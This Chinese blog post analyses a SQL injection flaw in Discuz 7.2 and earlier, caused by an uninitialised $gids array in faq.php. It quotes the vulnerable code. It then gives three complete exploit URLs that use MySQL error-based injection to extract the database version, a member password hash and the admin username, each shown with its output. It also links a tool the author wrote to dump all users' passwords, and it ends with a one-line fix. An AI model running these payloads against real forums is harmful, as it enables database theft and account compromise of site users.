Title: Discuz7.2及以下版本通杀漏洞分析
Date: 2014-07-03 06:08
Tags: Discuz


2014年7月2日真是个好日子，Discuz7.2及以下版本爆出一个惊天大漏洞，黑客可以直接脱库，甚至可以直接可以写入webshell


#### **1、漏洞代码分析**

请看下面注释分析，其实问题很简单，没有初始化变量，导致用户可以覆盖变量，引起注入。但凡做过开发的同学应该都知道，这个其实是一个很容易犯错的地方。在开发c、c++的时候有pclint工具可以检查，只要使用前没有初始化就报警，这类问题得到了很好的抑制。但脚本语言似乎并没有很好的工具，光靠人的编程技能，还是很难控制以后不会犯同样的错误。Discuz范的这个错误肯定不是偶然的，类似问题其它的网站或轻或重的应该也会存在的。

<code>

} elseif($action == 'grouppermission') {

	require_once './include/forum.func.php';
	require_once language('misc');
	$permlang = $language;
	unset($language);

	$searchgroupid = isset($searchgroupid) ? intval($searchgroupid) : $groupid;
    /* 此处没有对数组变量gids初始化 */
	$groups = $grouplist = array();
	$query = $db->query("SELECT groupid, type, grouptitle, radminid FROM {$tablepre}usergroups ORDER BY (creditshigher<>'0' || creditslower<>'0'), creditslower");
	$cgdata = $nextgid = '';
	while($group = $db->fetch_array($query)) {
		$group['type'] = $group['type'] == 'special' && $group['radminid'] ? 'specialadmin' : $group['type'];
		$groups[$group['type']][] = array($group['groupid'], $group['grouptitle']);
		$grouplist[$group['type']] .= '<option value="'.$group['groupid'].'"'.($searchgroupid == $group['groupid'] ? ' selected="selected"' : '').'>'.$group['grouptitle'].($groupid == $group['groupid'] ? ' &larr;' : '').'</option>';
		if($group['groupid'] == $searchgroupid) {
			$cgdata = array($group['type'], count($groups[$group['type']]) - 1, $group['groupid']);
		}
    }

    /* 根据不同的情况对gids前4位变量进行赋值 */
	if($cgdata[0] == 'member') {
		$nextgid = $groups[$cgdata[0]][$cgdata[1] + 1][0];
		if($cgdata[1] > 0) {
			$gids[1] = $groups[$cgdata[0]][$cgdata[1] - 1];
		}
		$gids[2] = $groups[$cgdata[0]][$cgdata[1]];
		if($cgdata[1] < count($groups[$cgdata[0]]) - 1) {
			$gids[3] = $groups[$cgdata[0]][$cgdata[1] + 1];
			if(count($gids) == 2) {
				$gids[4] = $groups[$cgdata[0]][$cgdata[1] + 2];
			}
		} elseif(count($gids) == 2) {
			$gids[0] = $groups[$cgdata[0]][$cgdata[1] - 2];
		}
	} else {
		$gids[1] = $groups[$cgdata[0]][$cgdata[1]];
	}
	ksort($gids);
    $groupids = array();

    /* 将gids内容拷贝到数组变量groupids中 */
	foreach($gids as $row) {
		$groupids[] = $row[0];
	}

    /* 利用groupids中的内容查询数据，由于gids变量没有初始化，用户可以构造一个请求对gids变量进行覆盖，导致groupids可控，只要闭合下面的IN()，即可注入 */
	$query = $db->query("SELECT * FROM {$tablepre}usergroups u LEFT JOIN {$tablepre}admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (".implodeids($groupids).")");
	$groups = array();
	while($group = $db->fetch_array($query)) {
		$group['maxattachsize'] = $group['maxattachsize'] / 1024;

</code>


#### **2、利用方法**

1、url中传入gids变量，需要闭合in，并利用mysql的floor报错注入法即可实现，如下输入，可以爆出数据库版本

    http://172.16.28.132/Discuz/Discuz_7.2_SC_UTF8/upload/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23

输出结果

    Discuz! info: MySQL Query Error
    
    Time: 2014-7-3 7:01am
    Script: /Discuz/Discuz_7.2_SC_UTF8/upload/faq.php

    SQL: SELECT * FROM [Table]usergroups u LEFT JOIN [Table]admingroups a ON u.groupid=a.admingid WHERE u.groupid IN ('7','\',') and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#')
    Error: Duplicate entry '5.1.28-rc-community1' for key 'group_key'
    Errno.: 1062
    

2、只需要替换上面的version()，即可实现任意的注入操作，如下输入可以爆出数据库的密码

    http://172.16.28.132/Discuz/Discuz_7.2_SC_UTF8/upload/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select password from cdb_members limit 1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23

输出结果

    Discuz! info: MySQL Query Error
    
    Time: 2014-7-3 7:06am
    Script: /Discuz/Discuz_7.2_SC_UTF8/upload/faq.php
        
    SQL: SELECT * FROM [Table]usergroups u LEFT JOIN [Table]admingroups a ON u.groupid=a.admingid WHERE u.groupid IN ('7','\',') and (select 1 from (select count(*),concat((select password from [Table]members limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)#')
    Error: Duplicate entry '0644bf56b4ed45878f306b5f19dc1e0e1' for key 'group_key'
    Errno.: 1062
    

3、只需要替换上面的version()，即可实现任意的注入操作，如下输入可以爆出数据库的用户名

    http://172.16.28.132/Discuz/Discuz_7.2_SC_UTF8/upload/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select username from cdb_members limit 1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23

输出结果

    Discuz! info: MySQL Query Error
    
    Time: 2014-7-3 7:07am
    Script: /Discuz/Discuz_7.2_SC_UTF8/upload/faq.php
    
    SQL: SELECT * FROM [Table]usergroups u LEFT JOIN [Table]admingroups a ON u.groupid=a.admingid WHERE u.groupid IN ('7','\',') and (select 1 from (select count(*),concat((select username from [Table]members limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)#')
    Error: Duplicate entry 'admin1' for key 'group_key'
    Errno.: 1062
    

4、利用上面的思路自己写了一个小软件，可以读取所有的用户用密码

[工具源码下载链接](static/code/diz7.2.py)


#### **3、修复方法**

将如下代码

    $groups = $grouplist = array();

修改为

    $groups = $grouplist = $gids = array();

